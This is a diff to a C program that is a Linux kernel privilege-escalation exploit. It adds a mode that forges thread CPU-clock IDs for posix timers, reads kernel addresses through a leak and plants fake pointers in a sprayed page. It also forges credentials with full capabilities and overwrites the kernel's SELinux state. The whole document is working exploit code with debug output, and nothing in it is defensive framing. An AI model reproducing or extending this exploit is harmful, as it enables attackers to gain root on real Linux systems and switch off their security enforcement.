@@ -131,6 +131,7 @@ static int slab_slabs(void){
 /* ---------- child shared state ---------- */
 static volatile int g_go=0,g_started=0,g_stop=0;
 static volatile int g_exec_tid=0,g_fail=0,g_tgid=0;
+static int d3_mode(void);
 static void *g_base=0;static size_t g_len=0;
 static int NFILL=10000;
 static int TAILN=400;
@@ -144,10 +145,22 @@ static void *exec_thread(void *arg){
  prctl(PR_SET_NAME,"yt-exec",0,0,0);
  { sigset_t ss; sigemptyset(&ss); sigaddset(&ss,SIGRTMIN); pthread_sigmask(SIG_BLOCK,&ss,0); }
  struct sigevent ev;memset(&ev,0,sizeof ev);ev.sigev_notify=SIGEV_SIGNAL;ev.sigev_signo=SIGRTMIN;
- timer_t t;
- if(timer_create(CLOCK_THREAD_CPUTIME_ID,&ev,&t)!=0){g_fail=1000+errno;return 0;}
+ timer_t t,t2=0,t3=0;
+ int tid3=(int)syscall(SYS_gettid);
+ clockid_t c0=(clockid_t)(((~(unsigned)tid3)<<3)|4u);
+ clockid_t c1=(clockid_t)(((~(unsigned)tid3)<<3)|5u);
+ clockid_t c2=(clockid_t)(((~(unsigned)tid3)<<3)|6u);
+ if(timer_create(d3_mode()?c2:CLOCK_THREAD_CPUTIME_ID,&ev,&t)!=0){g_fail=1000+errno;return 0;}
+ if(d3_mode()){
+  if(timer_create(c0,&ev,&t2)!=0){g_fail=1100+errno;return 0;}
+  if(timer_create(c1,&ev,&t3)!=0){g_fail=1200+errno;return 0;}
+ }
  struct itimerspec its;memset(&its,0,sizeof its);its.it_value.tv_sec=3600;
  if(timer_settime(t,0,&its,NULL)!=0){g_fail=2000+errno;return 0;}
+ if(d3_mode()){
+  if(timer_settime(t2,0,&its,NULL)!=0){g_fail=2100+errno;return 0;}
+  if(timer_settime(t3,0,&its,NULL)!=0){g_fail=2200+errno;return 0;}
+ }
  prctl(PR_SET_NAME,"yt-execq",0,0,0);
  g_exec_tid=(int)syscall(SYS_gettid);
  g_go=1;
@@ -301,6 +314,49 @@ static unsigned long long g_cred=0,g_tg[4]={0,0,0,0};
 static unsigned long long g_un=0,g_sel=0;
 #define FULL_CAP_MASK 0x1ffffffffffULL
 static int g_pfd=-1; static void *g_pmap=0; static unsigned long long g_fakekva=0;
+
+static int d3_mode(void){return getenv("O3P_D3")!=NULL;}
+static unsigned long long d3_A[3],d3_off[3],d3_S[3];
+static int d3_setup(void){
+ unsigned long long rb[3]={TASK+0x870ULL,TASK+0x888ULL,TASK+0x8a0ULL};
+ for(int i=0;i<3;i++){
+  unsigned long long ad[1],vv[1]; ad[0]=rb[i];
+  int g=read_addrs(ad,vv,1);
+  if(g<=0||!vv[0]||(vv[0]>>48)!=0xffff){printf("D3 read fail i=%d got=%d v=0x%llx\n",i,g,vv[0]);return 1;}
+  d3_A[i]=vv[0]-0xe0ULL;
+  if((d3_A[i]&~0x1fffULL)!=PAGE){printf("D3 page split i=%d A=0x%llx page=0x%llx\n",i,d3_A[i],PAGE);return 1;}
+  d3_off[i]=d3_A[i]&0x1fffULL;
+  if(d3_off[i]<0x200||d3_off[i]+0x118>0x1f80){printf("D3 off bad i=%d off=0x%llx\n",i,d3_off[i]);return 1;}
+ }
+ d3_S[0]=g_sel-7ULL; d3_S[1]=g_fakekva+0x10ULL; d3_S[2]=g_fakekva+0x18ULL;
+ printf("D3ADDR a0=0x%llx a1=0x%llx a2=0x%llx off0=0x%llx off1=0x%llx off2=0x%llx\n",
+        d3_A[0],d3_A[1],d3_A[2],d3_off[0],d3_off[1],d3_off[2]);fflush(stdout);
+ return 0;
+}
+static void d3_build(void){
+ memset(pat,0,sizeof pat);
+ {unsigned long long v=MARKVAL;memcpy(pat+mk,&v,8);}
+ for(int i=0;i<3;i++){
+  {unsigned long long v=0;memcpy(pat+d3_off[i]+0xe0,&v,8);}
+  {unsigned long long v=0;memcpy(pat+d3_off[i]+0xe8,&v,8);}
+  {unsigned long long v=d3_S[i];memcpy(pat+d3_off[i]+0xf0,&v,8);}
+ }
+ {unsigned long long *q=(unsigned long long*)g_pmap; if(q)q[3]=0xdeadbeefULL;}
+}
+static int detect_d3(void){
+ unsigned long long ad[10],vv[10];int n2=0;
+ ad[n2++]=MARK;
+ for(int i=0;i<3;i++){ad[n2++]=PAGE+d3_off[i]+0xe0;ad[n2++]=PAGE+d3_off[i]+0xe8;ad[n2++]=PAGE+d3_off[i]+0xf0;}
+ int g=read_addrs(ad,vv,n2); if(g<=0)return 0; if(vv[0]!=MARKVAL)return 0;
+ for(int i=0;i<3;i++){
+  int b=1+3*i;
+  printf("  E3[%d] 0x%llx=0x%llx 0x%llx=0x%llx 0x%llx=0x%llx\n",
+         i,ad[b],vv[b],ad[b+1],vv[b+1],ad[b+2],vv[b+2]);
+  if(vv[b]||vv[b+1]||vv[b+2]!=d3_S[i])return 0;
+ }
+ return 1;
+}
+
 static unsigned long long g_sec=0,g_usr=0,g_uc=0,g_gi=0;
 static unsigned long long g_secw[3]={0,0,0}; static int g_sec_ok=0;
 static int g_armed=0; static char g_self[256]={0};
@@ -406,10 +462,15 @@ static int do_attempt(int att, pid_t *outpid){
    printf("CHURN afterwait slabs=%d\n",slab_slabs());fflush(stdout);
  }
   mk=0x1a00ULL;MARK=PAGE+mk;
-  if(g_selmode&&g_stage==0){ if(!g_un){printf("VERDICT NO_SLIDE\n");benign_cleanup(pid,zombie);return 1;} g_sel=SELINUX_STATE_STATIC+(g_un-INIT_USER_NS_STATIC); S=selzero_mode()?(g_sel-7ULL):g_sel; } else S=PTASK+0x908;
+  if(d3_mode()&&g_stage==0){
+    if(!g_un){printf("VERDICT NO_SLIDE\n");benign_cleanup(pid,zombie);return 1;}
+    g_sel=SELINUX_STATE_STATIC+(g_un-INIT_USER_NS_STATIC);
+    if(d3_setup()){printf("VERDICT D3_SETUP\n");benign_cleanup(pid,zombie);return 1;}
+    S=d3_S[0];
+  } else { if(g_selmode&&g_stage==0){ if(!g_un){printf("VERDICT NO_SLIDE\n");benign_cleanup(pid,zombie);return 1;} g_sel=SELINUX_STATE_STATIC+(g_un-INIT_USER_NS_STATIC); S=selzero_mode()?(g_sel-7ULL):g_sel; } else S=PTASK+0x908; }
 printf("FAKEPAGE kva=0x%llx MARK=0x%llx S=0x%llx stage=%d\n",g_fakekva,MARK,S,g_stage);fflush(stdout);
  fill_fake_cred(N);
- build_pattern();
+ if(d3_mode()&&g_stage==0)d3_build();else build_pattern();
   int hit=0;
   printf("km8k_before=%d posix_before=%d\n",slab_named("kmalloc-8k"),slab_named("posix_timers_cache"));fflush(stdout);
   printf("DBG3 leaks=%d delay=%d mode=%d pairs=%d\n",g_nleak,g_delay,g_mode,g_pairs);fflush(stdout);
@@ -442,7 +503,7 @@ printf("FAKEPAGE kva=0x%llx MARK=0x%llx S=0x%llx stage=%d\n",g_fakekva,MARK,S,g_
       if(strstr(line," al: (")){unsigned long long v=field_u64(line,"page=");if(v&&g_nalloc<ALMAX)g_alloc[g_nalloc++]=v;}
    }}
    printf("BURST sent=%d alloc=%d bytes=%zu\n",nsv,g_nalloc,tl);fflush(stdout);
-   hit=detect_hit();
+   hit=(d3_mode()&&g_stage==0)?detect_d3():detect_hit();
    {int lim=g_nleak<512?g_nleak:512;int vm=0,lm=0;unsigned long long spv=sp_of(A);
     for(int j=0;j<g_nalloc;j++){
       if(g_alloc[j]==spv)vm++;
@@ -917,7 +978,7 @@ static void reap_calib(pid_t pid){
  tlen=read_trace(tbuf,48u<<20);
  printf("waitpid=%d status=%d trace=%zu\n",(int)wr,st,tlen);fflush(stdout);
  if(g_selmode&&g_stage==0){
-  int z=selzero_mode();
+  int z=selzero_mode()||d3_mode();
   unsigned long long ad[8],vv[8];int n=0;
   ad[n++]=z?(g_sel-7ULL):g_sel;ad[n++]=g_sel;ad[n++]=g_sel+0x08;ad[n++]=g_sel+0x40;ad[n++]=PTASK+0x908;ad[n++]=PTASK+0x900;ad[n++]=g_fakekva;
   int g=read_addrs(ad,vv,n);
@@ -928,6 +989,8 @@ static void reap_calib(pid_t pid){
     int ok=(vv[0]==0ULL)&&((vv[1]&0xffULL)==0ULL)&&(((vv[1]>>8)&0xffULL)!=0ULL);
     printf("SELWRITE target=0x%llx want=0x0 val=0x%llx %s state=0x%llx\n",ad[0],vv[0],ok?"SEL_OK":"SEL_FAIL",vv[1]);
     if(ok)g_stage++;
+    if(d3_mode()){unsigned long long *q=(unsigned long long*)g_pmap;
+      printf("D3PAGE slot0=0x%llx slot1=0x%llx slot2=0x%llx slot3=0x%llx\n",q[0],q[1],q[2],q[3]);fflush(stdout);}
    } else {
     unsigned long long ex=g_fakekva|0x100ULL;
     int ok=(vv[0]==ex)&&((vv[0]&0xffULL)==0ULL)&&(((vv[0]>>8)&0xffULL)!=0ULL);
@@ -996,7 +1059,7 @@ int main(int argc,char**argv){
  if(argc>7)g_churn=atoi(argv[7]);
  if(argc>8)g_chwait=atoi(argv[8]);
  if(NFILL<1)NFILL=1;if(NFILL>NFILL_MAX)NFILL=NFILL_MAX;
-  if(getenv("O3P_NOSEL"))g_selmode=0;g_ntg=g_selmode?2:1;
+  if(getenv("O3P_NOSEL"))g_selmode=0;g_ntg=g_selmode?2:1;if(d3_mode())g_ntg=1;
  setvbuf(stdout,0,_IONBF,0);
  { struct rlimit rl; rl.rlim_cur=524288; rl.rlim_max=524288; setrlimit(RLIMIT_NOFILE,&rl); }
  {char bb[96];int n=0;int fd=open("/proc/sys/kernel/random/boot_id",O_RDONLY);if(fd>=0){n=(int)read(fd,bb,95);close(fd);}if(n>0){int i2=0;while(i2<n && bb[i2]!=10 && bb[i2]!=13)i2++;fputs("BOOTID ",stdout);for(int k2=0;k2<i2;k2++)putchar(bb[k2]);putchar(10);fflush(stdout);}}
